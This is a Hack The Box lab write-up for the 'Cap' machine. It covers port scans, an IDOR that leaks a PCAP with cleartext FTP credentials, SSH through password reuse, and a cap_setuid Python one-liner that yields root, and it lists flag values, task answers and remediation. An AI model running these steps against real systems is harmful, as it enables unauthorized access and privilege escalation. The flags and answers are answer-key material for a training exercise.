# Hack The Box — Cap

- **Target:** 10.129.25.55
- **OS:** Linux (Ubuntu 20.04 Focal)
- **Difficulty:** Easy
- **Date:** 2026-07-03
- **Result:** Rooted 🚩

| Flag | Value |
|------|-------|
| user.txt | `13f7d1b09147337fb0b06e3f8d65a16c` |
| root.txt | `3d705abc35316d6b67858bd3f0234cd2` |

---

## Task Answers (quick reference)

| # | Question | Answer |
|---|----------|--------|
| 1 | How many TCP ports are open? | **3** |
| 2 | What is the web framework / server behind port 80? | gunicorn (Python / Flask) |
| 3 | Which HTTP endpoint exposes an IDOR? | `/data/<id>` → `/download/<id>` |
| 4 | Vulnerability class for initial foothold | IDOR → cleartext FTP creds in a PCAP |
| 5 | Foothold credentials | `nathan : Buck3tH4TF0RM3!` |
| 6 | Privesc vector | `cap_setuid` capability on `/usr/bin/python3.8` |

---

## 1. Enumeration

### Port scan (RustScan)

RustScan sweeps all 65,535 TCP ports in seconds, then pipes the open ones into nmap for service/script detection:

```bash
rustscan -a 10.129.25.55 --range 1-65535 --ulimit 5000 -- -sV -sC
```

```
Open 10.129.25.55:21
Open 10.129.25.55:22
Open 10.129.25.55:80

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack gunicorn
|_http-title: Security Dashboard
|_http-methods: GET OPTIONS HEAD
```

RustScan discovered **3 open ports** (21, 22, 80) — matching a follow-up full nmap scan.

### Port scan (nmap, for reference)

Full TCP scan with service/script detection:

```bash
nmap -sC -sV -T4 -p- --min-rate 2000 10.129.25.55
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
```

> **Q1 — How many TCP ports are open? → `3`**
> The open ports are **21 (FTP)**, **22 (SSH)**, and **80 (HTTP)**.

Notes from recon:
- FTP is **vsftpd 3.0.3** — anonymous login is **denied** (`530 Login incorrect`).
- SSH is OpenSSH 8.2p1 on Ubuntu Focal.
- Port 80 is a Python app served by **gunicorn** — the title is *"Security Dashboard"*.

### Web application

The dashboard exposes these routes:

| Route | Function |
|-------|----------|
| `/` | Dashboard home (user "Nathan") |
| `/ip` | Server-side `ifconfig` output |
| `/netstat` | Server-side `netstat` output |
| `/capture` | Runs a ~5-second `tcpdump`, then redirects to `/data/<id>` |
| `/data/<id>` | Shows packet stats for capture `<id>` |
| `/download/<id>` | Downloads `<id>.pcap` |

The `/ip` and `/netstat` pages just print static server-side command output — no user input reaches them, so no injection there. The live surface is `/capture`, which saves each capture under a **sequential numeric ID**.

---

## 2. Foothold — IDOR to leaked FTP credentials

The `/capture` → `/data/<id>` → `/download/<id>` flow uses a **predictable, sequential ID with no authorization check** — a textbook **IDOR (Insecure Direct Object Reference)**.

Any new captures *I* triggered (ids 1, 2, 3 …) were empty, because the capture window is a quiet ~5 seconds. But the **pre-seeded capture at id `0`** contains a real, previously recorded session:

```bash
curl -s http://10.129.25.55/download/0 -o cap0.pcap
tcpdump -r cap0.pcap -nn -A | grep -iE 'USER |PASS |230 '
```

```
FTP: USER nathan
FTP: 331 Please specify the password.
FTP: PASS Buck3tH4TF0RM3!
FTP: 230 Login successful.
```

FTP is cleartext, so the pcap hands us the credentials:

```
nathan : Buck3tH4TF0RM3!
```

**Key takeaway:** any download/report endpoint with sequential IDs should be tested from `0` upward — the interesting data is rarely at the ID the app just gave you.

### SSH in (password reuse)

The FTP password is reused for SSH:

```bash
sshpass -p 'Buck3tH4TF0RM3!' ssh nathan@10.129.25.55
```

```bash
id
# uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
cat ~/user.txt
# 13f7d1b09147337fb0b06e3f8d65a16c
```

**User flag captured.**

---

## 3. Privilege Escalation — cap_setuid on python3.8

Enumerating Linux capabilities:

```bash
getcap -r /usr/bin/ 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
...
```

`/usr/bin/python3.8` carries **`cap_setuid`**. That capability lets the binary call `setuid(0)` and become root without any password or SUID bit:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("cat /root/root.txt")'
```

```
3d705abc35316d6b67858bd3f0234cd2
```

**Root flag captured.**

> Note: only `cap_setuid` is granted, **not** `cap_setgid` — calling `os.setgid(0)` raises `PermissionError`. Drop it and use `setuid(0)` alone. `id` after escalation confirms `uid=0(root)` even though `gid` stays `1001`.

---

## 4. Remediation

- **IDOR:** enforce per-user authorization on `/data/<id>` and `/download/<id>`; use unpredictable identifiers (UUIDs) and scope captures to the requesting session.
- **Cleartext FTP:** disable FTP or replace with FTPS/SFTP so credentials aren't sniffable; never store real credentials in demo/sample captures.
- **Excess capabilities:** remove `cap_setuid` from the Python interpreter (`setcap -r /usr/bin/python3.8`). A general-purpose interpreter should never hold privilege-changing capabilities.
- **Password reuse:** separate FTP and SSH credentials.

---

## Attack chain summary

```
nmap (3 ports: 21/22/80)
  └─ port 80: Flask "Security Dashboard" (gunicorn)
       └─ IDOR on /download/0  ──►  PCAP with cleartext FTP login
            └─ nathan : Buck3tH4TF0RM3!  (password reuse → SSH)  ──►  user.txt
                 └─ getcap: python3.8 = cap_setuid
                      └─ os.setuid(0)  ──►  root  ──►  root.txt
```
